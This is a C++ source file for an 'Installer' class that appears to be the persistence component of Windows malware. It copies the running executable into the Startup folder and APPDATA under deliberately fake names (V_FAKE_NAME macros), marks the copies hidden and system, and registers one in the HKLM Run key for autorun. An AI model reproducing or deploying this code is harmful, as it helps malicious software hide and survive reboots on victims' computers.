#include "stdafx.h"
#include "Installer.h"
#include "Settings.h"

Installer installer;

Installer::Installer()
{
	GetModuleFileName(NULL, exeName, MAX_PATH);

	TCHAR *appData;
	size_t appDataSize;
	_tdupenv_s(&appData, &appDataSize, _T("APPDATA"));

	appDataPath[0] = '\0';
	_tcscat_s(appDataPath, appData);
	_tcscat_s(appDataPath, _T("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" V_FAKE_NAME1));

	registryPath[0] = '\0';
	_tcscat_s(registryPath, appData);
	_tcscat_s(registryPath, _T("\\" V_FAKE_NAME2));

	free(appData);
}
Installer::~Installer()
{

}

bool Installer::SetAutorun(bool autorun)
{
	return SetAutorunAppdata(autorun) | SetAutorunRegistry(autorun);
}

bool Installer::CopyTo(TCHAR* path)
{
	if (GetFileAttributes(path) != INVALID_FILE_ATTRIBUTES)
	{
		return true;
	}
	else if (CopyFile(exeName, path, FALSE))
	{
		SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
		return true;
	}
	else
	{
		Error(_T("Failed to copy file"));
		return false;
	}
}
bool Installer::SetAutorunAppdata(bool autorun)
{
	if (autorun)
	{
		return this->CopyTo(appDataPath);
	}
	else
	{
		return DeleteFile(appDataPath) != 0;
	}
}
bool Installer::SetAutorunRegistry(bool autorun)
{
	HKEY hKey;

	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
		0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKey, NULL)
		!= ERROR_SUCCESS)
	{
		return false;
	}

	bool ret = false;

	if (autorun)
	{
		if (!this->CopyTo(registryPath))
		{
			goto g_end;
		}

		if (RegSetValueEx(hKey, V_FAKE_NAME2, 0, REG_SZ,
			(const BYTE*)registryPath, (lstrlen(registryPath) + 1) * sizeof(TCHAR))
			!= ERROR_SUCCESS)
		{
			goto g_end;
		}
	}
	else
	{
		RegDeleteValue(hKey, V_FAKE_NAME2);

		if (!DeleteFile(registryPath))
		{
			goto g_end;
		}
	}

	ret = true;
g_end:
	RegCloseKey(hKey);
	return ret;
}